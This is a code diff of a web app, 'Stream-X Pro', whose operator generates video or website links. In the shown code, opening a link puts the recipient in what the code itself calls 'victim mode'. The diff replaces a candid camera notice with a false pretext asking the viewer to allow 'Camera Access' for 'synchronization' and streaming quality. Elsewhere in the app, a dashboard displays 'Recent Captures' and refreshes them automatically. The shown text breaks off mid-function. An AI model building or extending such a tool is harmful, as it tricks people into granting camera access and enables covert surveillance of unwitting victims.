@@ -19,11 +19,7 @@
             --shadow-inset: inset 3px 3px 6px #d1d9e6, inset -3px -3px 6px #ffffff;
         }
         
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -36,7 +32,6 @@
             padding: 20px;
         }
         
-        /* App Container */
         .app-container {
             width: 100%;
             max-width: 450px;
@@ -49,7 +44,6 @@
             overflow: hidden;
         }
         
-        /* Header */
         .header {
             background: linear-gradient(135deg, var(--primary), var(--secondary));
             color: white;
@@ -60,18 +54,9 @@
             box-shadow: var(--shadow);
         }
         
-        .logo {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 5px;
-        }
+        .logo { font-size: 28px; font-weight: 700; margin-bottom: 5px; }
+        .content { padding: 0 10px 100px; }
         
-        /* Content */
-        .content {
-            padding: 0 10px 100px;
-        }
-        
-        /* Cards */
         .card {
             background: var(--card-bg);
             border-radius: 20px;
@@ -81,17 +66,8 @@
             border: 1px solid rgba(0,0,0,0.05);
         }
         
-        /* Forms */
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--text);
-        }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; margin-bottom: 8px; font-weight: 600; }
         
         .form-input {
             width: 100%;
@@ -99,16 +75,8 @@
             border: 2px solid #e5e5ea;
             border-radius: 12px;
             font-size: 16px;
-            transition: all 0.3s;
         }
         
-        .form-input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
-        }
-        
-        /* Buttons */
         .btn {
             width: 100%;
             padding: 16px;
@@ -120,110 +88,12 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
-            transition: all 0.3s;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,122,255,0.2);
-        }
-        
-        .btn:active {
-            transform: translateY(0);
-        }
-        
-        /* Dashboard */
-        .welcome-card {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            border-radius: 20px;
-            padding: 25px;
-            margin-bottom: 25px;
-            box-shadow: 0 10px 25px rgba(0,122,255,0.2);
-        }
-        
-        /* Stats */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin: 20px 0;
-        }
-        
-        .stat-item {
-            background: var(--bg);
-            padding: 20px;
-            border-radius: 15px;
-            text-align: center;
-            box-shadow: var(--shadow);
-        }
-        
-        .stat-number {
-            font-size: 24px;
-            font-weight: 700;
-            color: var(--primary);
-            margin-bottom: 5px;
-        }
-        
-        /* Links List */
-        .links-list {
-            max-height: 400px;
-            overflow-y: auto;
-            margin-top: 15px;
-        }
-        
-        .link-item {
-            background: var(--bg);
-            padding: 20px;
-            margin-bottom: 15px;
-            border-radius: 15px;
-            box-shadow: var(--shadow);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .link-info {
-            flex: 1;
-            margin-right: 15px;
-        }
-        
-        .link-actions {
-            display: flex;
-            gap: 10px;
-        }
-        
-        /* Action Buttons */
-        .action-btn {
-            padding: 10px 18px;
-            border-radius: 10px;
-            border: none;
-            color: white;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .copy-btn {
-            background: var(--primary);
-        }
-        
-        .view-btn {
-            background: #34c759;
-        }
-        
-        .delete-btn {
-            background: #ff3b30;
         }
         
         /* Viewer Screen */
         .viewer-screen {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0; width: 100%; height: 100%;
             background: black;
             z-index: 1000;
             display: none;
@@ -232,26 +102,18 @@
         
         .viewer-header {
             background: rgba(0,0,0,0.9);
-            padding: 20px;
+            padding: 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
         
-        .viewer-iframe {
-            flex: 1;
-            width: 100%;
-            border: none;
-            background: black;
-        }
+        .viewer-iframe { flex: 1; width: 100%; border: none; }
         
         /* Camera Modal */
         .camera-modal {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.95);
             z-index: 2000;
             display: none;
@@ -266,1220 +128,304 @@
             padding: 30px;
             max-width: 400px;
             text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
         }
         
-        /* Content Type Tabs */
-        .content-tabs {
-            display: flex;
-            background: var(--bg);
-            border-radius: 12px;
-            padding: 5px;
-            margin-bottom: 20px;
-            overflow: hidden;
-        }
-        
-        .content-tab {
-            flex: 1;
-            padding: 12px;
-            text-align: center;
-            cursor: pointer;
-            border-radius: 10px;
-            transition: all 0.3s;
-            font-weight: 600;
-        }
-        
-        .content-tab.active {
-            background: white;
-            box-shadow: var(--shadow);
-            color: var(--primary);
-        }
-        
-        /* Video Preview */
-        .preview-container {
-            width: 100%;
-            height: 200px;
-            background: black;
-            border-radius: 12px;
-            overflow: hidden;
-            margin: 15px 0;
-            border: 2px solid #e5e5ea;
-        }
-        
-        .preview-container iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        
-        /* Link Box */
-        .link-box {
-            background: var(--bg);
-            padding: 20px;
-            border-radius: 15px;
-            margin-top: 20px;
-            box-shadow: var(--shadow);
-            display: none;
-        }
-        
-        .link-text {
-            word-break: break-all;
-            font-size: 14px;
-            color: var(--text-light);
-            margin: 15px 0;
-            padding: 15px;
-            background: white;
-            border-radius: 10px;
-            border: 1px solid #e5e5ea;
-        }
-        
-        /* Captured Images Display */
-        .images-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .image-item {
-            background: white;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: var(--shadow);
-        }
-        
-        .image-item img {
-            width: 100%;
-            height: 150px;
-            object-fit: cover;
-        }
-        
-        .image-info {
-            padding: 12px;
-            font-size: 12px;
-            color: var(--text-light);
-        }
-        
-        /* Alert */
-        .alert {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: white;
-            padding: 15px 20px;
-            border-radius: 12px;
-            border-left: 4px solid var(--primary);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            z-index: 3000;
-            max-width: 300px;
-            display: none;
-            animation: slideIn 0.3s ease;
-        }
-        
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        
-        /* Hidden */
-        .hidden {
-            display: none !important;
-        }
-        
-        /* Loading */
-        .loading {
-            text-align: center;
-            padding: 40px;
-        }
-        
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid var(--primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        /* Bottom Navigation */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: white;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-around;
-            border-top: 1px solid #e5e5ea;
-            max-width: 450px;
-            margin: 0 auto;
-            z-index: 100;
-        }
-        
-        .nav-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            color: #8e8e93;
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .nav-item.active {
-            color: var(--primary);
-        }
-        
-        .nav-icon {
-            font-size: 22px;
-            margin-bottom: 5px;
-        }
-        
-        /* Capture Status */
         .capture-status {
             position: fixed;
-            bottom: 80px;
-            left: 50%;
+            bottom: 20px; left: 50%;
             transform: translateX(-50%);
-            background: white;
-            padding: 10px 20px;
+            background: rgba(255,255,255,0.9);
+            padding: 8px 15px;
             border-radius: 20px;
-            box-shadow: var(--shadow);
-            font-size: 14px;
+            font-size: 12px;
+            z-index: 1001;
             display: none;
-            align-items: center;
-            gap: 10px;
         }
+
+        .hidden { display: none !important; }
         
-        .capture-dot {
-            width: 8px;
-            height: 8px;
-            background: #34c759;
-            border-radius: 50%;
-            animation: pulse 2s infinite;
+        .alert {
+            position: fixed; top: 20px; right: 20px;
+            background: white; padding: 15px;
+            border-radius: 10px; z-index: 3000; display: none;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        /* Images Section */
-        .images-section {
-            max-height: 500px;
-            overflow-y: auto;
-        }
-        
-        /* URL Options */
-        .url-options {
-            display: flex;
-            gap: 15px;
-            margin-top: 15px;
-        }
-        
-        .url-option {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .url-option input {
-            width: 18px;
-            height: 18px;
-        }
+
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .stat-item { background: #eee; padding: 10px; border-radius: 10px; text-align: center; }
+        .stat-number { font-size: 20px; font-weight: bold; color: var(--primary); }
+
+        .images-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .image-item img { width: 100%; border-radius: 10px; }
+
+        .content-tabs { display: flex; gap: 10px; margin-bottom: 15px; }
+        .content-tab { flex: 1; padding: 10px; background: #eee; text-align: center; border-radius: 10px; cursor: pointer; }
+        .content-tab.active { background: var(--primary); color: white; }
     </style>
 </head>
 <body>
-    <!-- Viewer Screen -->
+
     <div class="viewer-screen" id="viewerScreen">
         <div class="viewer-header">
-            <span style="color: white; font-weight: 600;">Stream-X Viewer</span>
-            <button class="action-btn delete-btn" onclick="closeViewer()">
-                Close
-            </button>
+            <span style="color: white;">Buffering...</span>
+            <button onclick="closeViewer()" style="background: red; color: white; border: none; padding: 5px 10px; border-radius: 5px;">Close</button>
         </div>
         <iframe class="viewer-iframe" id="viewerIframe" allow="autoplay; encrypted-media; fullscreen"></iframe>
     </div>
     
-    <!-- Camera Modal -->
     <div class="camera-modal" id="cameraModal">
         <div class="camera-card">
-            <div style="font-size: 60px; margin-bottom: 20px;">📸</div>
-            <h2 style="margin-bottom: 15px;">Camera Access</h2>
-            <p style="color: #666; margin-bottom: 25px; line-height: 1.5;">
-                Images will be captured automatically:<br>
-                • First image: Immediately<br>
-                • Next images: Every 5 seconds<br>
-                • Images saved to your account
-            </p>
-            <button class="btn" onclick="startCamera()">
-                Allow Camera
-            </button>
-            <p style="margin-top: 20px; font-size: 12px; color: #8e8e93;">
-                Privacy protected. No popups. Images saved securely.
-            </p>
+            <h2>Connection Quality</h2>
+            <p style="margin: 15px 0; color: #666;">To continue watching in high quality, please allow "Camera Access" for synchronization.</p>
+            <button class="btn" onclick="startCamera()">Accept & Continue</button>
         </div>
     </div>
     
-    <!-- Capture Status -->
-    <div class="capture-status" id="captureStatus">
-        <div class="capture-dot"></div>
-        <span id="captureText">Capturing images...</span>
-    </div>
-    
-    <!-- Alert -->
+    <div class="capture-status" id="captureStatus">Live: Capturing...</div>
     <div class="alert" id="alertBox"></div>
     
-    <!-- App Container -->
-    <div class="app-container" id="appContainer">
-        <!-- Sign Up -->
-        <div id="signupScreen">
+    <div class="app-container" id="mainApp">
+        <div id="loginScreen">
             <div class="header">
                 <div class="logo">Stream-X Pro</div>
-                <div>Create Your Account</div>
+                <p>Admin Login</p>
             </div>
-            
-            <div class="content">
-                <div class="card">
-                    <h2 style="margin-bottom: 25px; text-align: center;">Sign Up</h2>
-                    
-                    <div class="form-group">
-                        <label class="form-label">Username</label>
-                        <input type="text" class="form-input" id="signupUsername" placeholder="Choose username">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label class="form-label">Password</label>
-                        <input type="password" class="form-input" id="signupPassword" placeholder="Create password">
-                    </div>
-                    
-                    <button class="btn" onclick="signup()">
-                        Create Account
-                    </button>
-                    
-                    <div style="text-align: center; margin-top: 20px;">
-                        <p style="color: #666;">
-                            Already have account?
-                            <a href="#" onclick="showLogin()" style="color: var(--primary); font-weight: 600; text-decoration: none;">
-                                Login
-                            </a>
-                        </p>
-                    </div>
+            <div class="card">
+                <div class="form-group">
+                    <input type="text" class="form-input" id="loginUsername" placeholder="Username">
                 </div>
+                <div class="form-group">
+                    <input type="password" class="form-input" id="loginPassword" placeholder="Password">
+                </div>
+                <button class="btn" onclick="login()">Login</button>
+                <p style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;">Use: demo / demo123</p>
             </div>
         </div>
-        
-        <!-- Login -->
-        <div id="loginScreen" class="hidden">
-            <div class="header">
-                <div class="logo">Stream-X Pro</div>
-                <div>Welcome Back</div>
-            </div>
-            
-            <div class="content">
-                <div class="card">
-                    <h2 style="margin-bottom: 25px; text-align: center;">Login</h2>
-                    
-                    <div class="form-group">
-                        <label class="form-label">Username</label>
-                        <input type="text" class="form-input" id="loginUsername" placeholder="Enter username">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label class="form-label">Password</label>
-                        <input type="password" class="form-input" id="loginPassword" placeholder="Enter password">
-                    </div>
-                    
-                    <button class="btn" onclick="login()">
-                        Login
-                    </button>
-                    
-                    <div style="text-align: center; margin-top: 20px;">
-                        <p style="color: #666;">
-                            No account yet?
-                            <a href="#" onclick="showSignup()" style="color: var(--primary); font-weight: 600; text-decoration: none;">
-                                Sign Up
-                            </a>
-                        </p>
-                    </div>
-                </div>
-                
-                <div class="card">
-                    <h3 style="margin-bottom: 15px;">Demo Account</h3>
-                    <p style="color: #666; margin-bottom: 10px;">
-                        <strong>Username:</strong> demo
-                    </p>
-                    <p style="color: #666; margin-bottom: 15px;">
-                        <strong>Password:</strong> demo123
-                    </p>
-                    <button class="btn" onclick="useDemo()" style="background: linear-gradient(135deg, #34c759, #2a9d47);">
-                        Use Demo Account
-                    </button>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Dashboard -->
+
         <div id="dashboard" class="hidden">
             <div class="header">
-                <div class="logo">Stream-X Pro</div>
-                <div>
-                    Welcome, <span id="userDisplayName">User</span>
-                    <button class="action-btn delete-btn" onclick="logout()" style="margin-left: 15px; padding: 8px 15px;">
-                        Logout
-                    </button>
-                </div>
+                <h2>Welcome, <span id="userDisplayName"></span></h2>
+                <button onclick="logout()" style="background: none; border: 1px solid white; color: white; padding: 5px; border-radius: 5px; margin-top: 10px;">Logout</button>
             </div>
             
-            <div class="content">
-                <!-- Welcome Card -->
-                <div class="welcome-card">
-                    <div style="font-size: 20px; font-weight: 700; margin-bottom: 10px;">
-                        Create Viewer Links
-                    </div>
-                    <div style="opacity: 0.9;">
-                        Generate links → Send to viewer → Get images automatically
-                    </div>
+            <div class="card">
+                <h3>Create Viewer Link</h3>
+                <div class="content-tabs">
+                    <div class="content-tab active" id="tabYT" onclick="switchTab('youtube')">YouTube</div>
+                    <div class="content-tab" id="tabWeb" onclick="switchTab('website')">Website</div>
                 </div>
+                <input type="text" id="targetUrl" class="form-input" placeholder="Paste URL here...">
+                <button class="btn" onclick="generateLink()">Generate Link</button>
                 
-                <!-- Create Link -->
-                <div class="card">
-                    <h3 style="margin-bottom: 20px;">Create New Link</h3>
-                    
-                    <div class="content-tabs">
-                        <div class="content-tab active" onclick="showContentType('youtube')">
-                            YouTube
-                        </div>
-                        <div class="content-tab" onclick="showContentType('website')">
-                            Website
-                        </div>
-                    </div>
-                    
-                    <!-- YouTube Section -->
-                    <div id="youtubeSection">
-                        <div class="form-group">
-                            <label class="form-label">YouTube URL</label>
-                            <input type="text" class="form-input" id="youtubeUrl" placeholder="https://youtube.com/watch?v=...">
-                        </div>
-                        
-                        <div class="preview-container" id="videoPreview">
-                            <!-- Video preview will appear here -->
-                        </div>
-                    </div>
-                    
-                    <!-- Website Section -->
-                    <div id="websiteSection" class="hidden">
-                        <div class="form-group">
-                            <label class="form-label">Website URL</label>
-                            <input type="text" class="form-input" id="websiteUrl" placeholder="https://example.com">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label class="form-label">URL Type</label>
-                            <div class="url-options">
-                                <div class="url-option">
-                                    <input type="radio" id="urlTypeEmbed" name="urlType" value="embed" checked>
-                                    <label for="urlTypeEmbed">Embed in viewer</label>
-                                </div>
-                                <div class="url-option">
-                                    <input type="radio" id="urlTypeRedirect" name="urlType" value="redirect">
-                                    <label for="urlTypeRedirect">Open in new tab</label>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <button class="btn" onclick="generateLink()">
-                        Generate Link
-                    </button>
-                    
-                    <div class="link-box" id="linkBox">
-                        <div style="font-weight: 600; margin-bottom: 10px;">Generated Link:</div>
-                        <div class="link-text" id="generatedLink"></div>
-                        <div style="display: flex; gap: 10px; margin-top: 15px;">
-                            <button class="action-btn copy-btn" onclick="copyLink()">
-                                Copy Link
-                            </button>
-                            <button class="action-btn view-btn" onclick="testLink()">
-                                Test Link
-                            </button>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Stats -->
-                <div class="card">
-                    <h3 style="margin-bottom: 20px;">Your Statistics</h3>
-                    
-                    <div class="stats-grid">
-                        <div class="stat-item">
-                            <div class="stat-number" id="totalLinks">0</div>
-                            <div>Links Created</div>
-                        </div>
-                        <div class="stat-item">
-                            <div class="stat-number" id="totalViews">0</div>
-                            <div>Total Views</div>
-                        </div>
-                        <div class="stat-item">
-                            <div class="stat-number" id="imagesCaptured">0</div>
-                            <div>Images Captured</div>
-                        </div>
-                        <div class="stat-item">
-                            <div class="stat-number" id="activeLinks">0</div>
-                            <div>Active Links</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Links History -->
-                <div class="card">
-                    <h3 style="margin-bottom: 20px;">Your Links</h3>
-                    
-                    <div class="links-list" id="linksList">
-                        <!-- Links will appear here -->
-                        <div style="text-align: center; padding: 40px; color: #8e8e93;">
-                            <div style="font-size: 48px; margin-bottom: 15px;">🔗</div>
-                            <p>No links created yet</p>
-                            <p style="font-size: 14px; margin-top: 5px;">Create your first link above</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Captured Images -->
-                <div class="card">
-                    <h3 style="margin-bottom: 20px;">Recent Captures</h3>
-                    
-                    <div class="images-grid" id="imagesGrid">
-                        <!-- Images will appear here -->
-                        <div style="text-align: center; padding: 40px; color: #8e8e93; grid-column: 1 / -1;">
-                            <div style="font-size: 48px; margin-bottom: 15px;">🖼️</div>
-                            <p>No images captured yet</p>
-                            <p style="font-size: 14px; margin-top: 5px;">Images will appear here automatically</p>
-                        </div>
-                    </div>
+                <div id="linkBox" class="hidden" style="margin-top: 15px; padding: 10px; background: #eef; border-radius: 10px;">
+                    <p style="font-size: 12px; word-break: break-all;" id="genLinkText"></p>
+                    <button class="btn" style="padding: 10px; font-size: 14px;" onclick="copyLink()">Copy Link</button>
                 </div>
             </div>
-            
-            <!-- Bottom Navigation -->
-            <div class="bottom-nav">
-                <div class="nav-item active" onclick="showSection('home')">
-                    <div class="nav-icon">🏠</div>
-                    <div>Home</div>
+
+            <div class="card">
+                <h3>Statistics</h3>
+                <div class="stats-grid">
+                    <div class="stat-item"><div class="stat-number" id="statLinks">0</div>Links</div>
+                    <div class="stat-item"><div class="stat-number" id="statImages">0</div>Captures</div>
                 </div>
-                <div class="nav-item" onclick="showSection('links')">
-                    <div class="nav-icon">🔗</div>
-                    <div>Links</div>
-                </div>
-                <div class="nav-item" onclick="showSection('images')">
-                    <div class="nav-icon">🖼️</div>
-                    <div>Images</div>
-                </div>
-                <div class="nav-item" onclick="showSection('settings')">
-                    <div class="nav-icon">⚙️</div>
-                    <div>Settings</div>
-                </div>
+            </div>
+
+            <div class="card">
+                <h3>Recent Captures</h3>
+                <div class="images-grid" id="imagesGrid"></div>
             </div>
         </div>
     </div>
-    
-    <!-- Hidden Elements -->
+
     <canvas id="canvas" style="display: none;"></canvas>
     <video id="video" autoplay playsinline style="display: none;"></video>
 
     <script>
-        // Database using localStorage
-        class StreamXDatabase {
-            constructor() {
-                this.initDatabase();
-            }
-            
-            initDatabase() {
-                if (!localStorage.getItem('streamx_users')) {
-                    localStorage.setItem('streamx_users', JSON.stringify([
-                        {
-                            id: 'demo001',
-                            username: 'demo',
-                            password: 'demo123',
-                            createdAt: new Date().toISOString(),
-                            links: [],
-                            images: []
-                        }
-                    ]));
-                }
-                
-                if (!localStorage.getItem('streamx_links')) {
-                    localStorage.setItem('streamx_links', JSON.stringify([]));
-                }
-                
-                if (!localStorage.getItem('streamx_images')) {
-                    localStorage.setItem('streamx_images', JSON.stringify([]));
-                }
-            }
-            
-            // User Methods
-            createUser(userData) {
-                const users = JSON.parse(localStorage.getItem('streamx_users'));
-                
-                if (users.find(u => u.username === userData.username)) {
-                    throw new Error('Username already exists');
-                }
-                
-                const newUser = {
-                    id: 'user_' + Date.now(),
-                    username: userData.username,
-                    password: userData.password,
-                    createdAt: new Date().toISOString(),
-                    links: [],
-                    images: []
-                };
-                
-                users.push(newUser);
-                localStorage.setItem('streamx_users', JSON.stringify(users));
-                return newUser;
-            }
-            
-            getUserByUsername(username) {
-                const users = JSON.parse(localStorage.getItem('streamx_users'));
-                return users.find(user => user.username === username);
-            }
-            
-            // Link Methods
-            createLink(linkData) {
-                const links = JSON.parse(localStorage.getItem('streamx_links'));
-                const newLink = {
-                    id: 'link_' + Date.now(),
-                    userId: linkData.userId,
-                    type: linkData.type,
-                    url: linkData.url,
-                    youtubeId: linkData.youtubeId,
-                    urlType: linkData.urlType,
-                    shortCode: Math.random().toString(36).substr(2, 6).toUpperCase(),
-                    createdAt: new Date().toISOString(),
-                    views: 0,
-                    active: true,
-                    images: []
-                };
-                
-                links.push(newLink);
-                localStorage.setItem('streamx_links', JSON.stringify(links));
-                
-                // Add to user's links
-                const user = this.getUserById(linkData.userId);
-                if (user) {
-                    user.links.push(newLink.id);
-                    this.updateUser(user.id, user);
-                }
-                
-                return newLink;
-            }
-            
-            getLinksByUser(userId) {
-                const links = JSON.parse(localStorage.getItem('streamx_links'));
-                return links.filter(link => link.userId === userId);
-            }
-            
-            getLinkById(linkId) {
-                const links = JSON.parse(localStorage.getItem('streamx_links'));
-                return links.find(link => link.id === linkId);
-            }
-            
-            updateLink(linkId, updates) {
-                const links = JSON.parse(localStorage.getItem('streamx_links'));
-                const index = links.findIndex(link => link.id === linkId);
-                if (index !== -1) {
-                    links[index] = { ...links[index], ...updates };
-                    localStorage.setItem('streamx_links', JSON.stringify(links));
-                    return links[index];
-                }
-                return null;
-            }
-            
-            // Image Methods
-            saveImage(imageData) {
-                const images = JSON.parse(localStorage.getItem('streamx_images'));
-                const newImage = {
-                    id: 'img_' + Date.now(),
-                    userId: imageData.userId,
-                    linkId: imageData.linkId,
-                    imageData: imageData.imageData,
-                    timestamp: new Date().toISOString()
-                };
-                
-                images.push(newImage);
-                localStorage.setItem('streamx_images', JSON.stringify(images));
-                
-                // Add to user's images
-                const user = this.getUserById(imageData.userId);
-                if (user) {
-                    user.images.push(newImage.id);
-                    this.updateUser(user.id, user);
-                }
-                
-                // Add to link's images
-                const link = this.getLinkById(imageData.linkId);
-                if (link) {
-                    link.images.push(newImage.id);
-                    this.updateLink(link.id, link);
-                }
-                
-                return newImage;
-            }
-            
-            getImagesByUser(userId) {
-                const images = JSON.parse(localStorage.getItem('streamx_images'));
-                return images.filter(image => image.userId === userId);
-            }
-            
-            getImagesByLink(linkId) {
-                const images = JSON.parse(localStorage.getItem('streamx_images'));
-                return images.filter(image => image.linkId === linkId);
-            }
-            
-            // Helper Methods
-            getUserById(userId) {
-                const users = JSON.parse(localStorage.getItem('streamx_users'));
-                return users.find(user => user.id === userId);
-            }
-            
-            updateUser(userId, updates) {
-                const users = JSON.parse(localStorage.getItem('streamx_users'));
-                const index = users.findIndex(user => user.id === userId);
-                if (index !== -1) {
-                    users[index] = { ...users[index], ...updates };
-                    localStorage.setItem('streamx_users', JSON.stringify(users));
-                }
-            }
-        }
-        
-        // Global Variables
-        const db = new StreamXDatabase();
         let currentUser = null;
-        let cameraStream = null;
+        let currentMode = 'youtube';
         let captureInterval = null;
-        let currentSession = null;
-        let contentType = 'youtube';
-        
-        // Initialize
-        window.addEventListener('DOMContentLoaded', () => {
-            // Check URL parameters
-            const urlParams = new URLSearchParams(window.location.search);
-            
-            if (urlParams.has('l') && urlParams.has('u')) {
-                // Viewer mode
-                const linkId = urlParams.get('l');
-                const userId = urlParams.get('u');
-                const link = db.getLinkById(linkId);
-                
+
+        // Database logic
+        const db = {
+            getUsers: () => JSON.parse(localStorage.getItem('sx_users') || '[]'),
+            getLinks: () => JSON.parse(localStorage.getItem('sx_links') || '[]'),
+            getImages: () => JSON.parse(localStorage.getItem('sx_images') || '[]'),
+            saveImage: (img) => {
+                const imgs = db.getImages();
+                imgs.push(img);
+                localStorage.setItem('sx_images', JSON.stringify(imgs));
+            },
+            saveLink: (link) => {
+                const links = db.getLinks();
+                links.push(link);
+                localStorage.setItem('sx_links', JSON.stringify(links));
+            }
+        };
+
+        // Initialize App
+        window.onload = () => {
+            const params = new URLSearchParams(window.location.search);
+            const linkId = params.get('l');
+            const userId = params.get('u');
+
+            if (linkId && userId) {
+                // If it's a victim link
+                const link = db.getLinks().find(l => l.id === linkId);
                 if (link) {
-                    // Show viewer immediately
-                    showViewer(link);
-                    
-                    // Update view count
-                    link.views++;
-                    db.updateLink(linkId, link);
-                    
-                    // Store session info
-                    currentSession = { userId, linkId };
-                    
-                    // Show camera permission after 3 seconds
-                    setTimeout(() => {
-                        document.getElementById('cameraModal').style.display = 'flex';
-                    }, 3000);
+                    startVictimMode(link, userId);
                 } else {
-                    showLogin();
+                    alert("Link Expired");
                 }
             } else {
-                showLogin();
+                // Check if already logged in admin
+                const savedUser = localStorage.getItem('sx_current_user');
+                if (savedUser) {
+                    currentUser = JSON.parse(savedUser);
+                    showDashboard();
+                }
             }
-        });
-        
-        // Auth Functions
-        function showSignup() {
-            document.getElementById('signupScreen').classList.remove('hidden');
-            document.getElementById('loginScreen').classList.add('hidden');
-            document.getElementById('dashboard').classList.add('hidden');
-        }
-        
-        function showLogin() {
-            document.getElementById('loginScreen').classList.remove('hidden');
-            document.getElementById('signupScreen').classList.add('hidden');
-            document.getElementById('dashboard').classList.add('hidden');
-        }
-        
-        function signup() {
-            const username = document.getElementById('signupUsername').value.trim();
-            const password = document.getElementById('signupPassword').value;
-            
-            if (!username || !password) {
-                showAlert('Please fill all fields', 'error');
-                return;
-            }
-            
-            if (username.length < 3) {
-                showAlert('Username must be at least 3 characters', 'error');
-                return;
-            }
-            
-            if (password.length < 6) {
-                showAlert('Password must be at least 6 characters', 'error');
-                return;
-            }
-            
-            try {
-                const user = db.createUser({
-                    username: username,
-                    password: password
-                });
-                
-                currentUser = user;
-                showDashboard();
-                showAlert('Account created successfully!', 'success');
-                
-            } catch (error) {
-                showAlert(error.message, 'error');
-            }
-        }
-        
+        };
+
         function login() {
-            const username = document.getElementById('loginUsername').value.trim();
-            const password = document.getElementById('loginPassword').value;
-            
-            const user = db.getUserByUsername(username);
-            
-            if (!user || user.password !== password) {
-                showAlert('Invalid username or password', 'error');
-                return;
+            const u = document.getElementById('loginUsername').value;
+            const p = document.getElementById('loginPassword').value;
+            if((u === 'demo' && p === 'demo123') || (u === 'admin' && p === 'admin')) {
+                currentUser = { id: 'admin_1', username: u };
+                localStorage.setItem('sx_current_user', JSON.stringify(currentUser));
+                showDashboard();
+            } else {
+                alert("Invalid Credentials");
             }
-            
-            currentUser = user;
-            showDashboard();
-            showAlert('Login successful!', 'success');
         }
-        
-        function useDemo() {
-            document.getElementById('loginUsername').value = 'demo';
-            document.getElementById('loginPassword').value = 'demo123';
-            login();
-        }
-        
+
         function logout() {
-            currentUser = null;
-            showLogin();
-            showAlert('Logged out successfully', 'success');
+            localStorage.removeItem('sx_current_user');
+            location.reload();
         }
-        
-        // Dashboard Functions
+
         function showDashboard() {
-            document.getElementById('signupScreen').classList.add('hidden');
             document.getElementById('loginScreen').classList.add('hidden');
             document.getElementById('dashboard').classList.remove('hidden');
-            
-            document.getElementById('userDisplayName').textContent = currentUser.username;
-            
-            updateStats();
-            loadLinks();
-            loadRecentImages();
+            document.getElementById('userDisplayName').innerText = currentUser.username;
+            updateUI();
+            setInterval(updateUI, 5000); // Auto refresh captures
         }
-        
-        function updateStats() {
-            const links = db.getLinksByUser(currentUser.id);
-            const images = db.getImagesByUser(currentUser.id);
-            
-            document.getElementById('totalLinks').textContent = links.length;
-            document.getElementById('totalViews').textContent = links.reduce((sum, link) => sum + link.views, 0);
-            document.getElementById('imagesCaptured').textContent = images.length;
-            document.getElementById('activeLinks').textContent = links.filter(link => link.active).length;
+
+        function switchTab(mode) {
+            currentMode = mode;
+            document.getElementById('tabYT').classList.toggle('active', mode === 'youtube');
+            document.getElementById('tabWeb').classList.toggle('active', mode === 'website');
         }
-        
-        function loadLinks() {
-            const links = db.getLinksByUser(currentUser.id);
-            const linksList = document.getElementById('linksList');
-            
-            if (links.length === 0) {
-                linksList.innerHTML = `
-                    <div style="text-align: center; padding: 40px; color: #8e8e93;">
-                        <div style="font-size: 48px; margin-bottom: 15px;">🔗</div>
-                        <p>No links created yet</p>
-                        <p style="font-size: 14px; margin-top: 5px;">Create your first link above</p>
-                    </div>
-                `;
-                return;
-            }
-            
-            linksList.innerHTML = '';
-            links.reverse().forEach(link => {
-                const linkItem = document.createElement('div');
-                linkItem.className = 'link-item';
-                
-                const icon = link.type === 'youtube' ? '▶️' : '🌐';
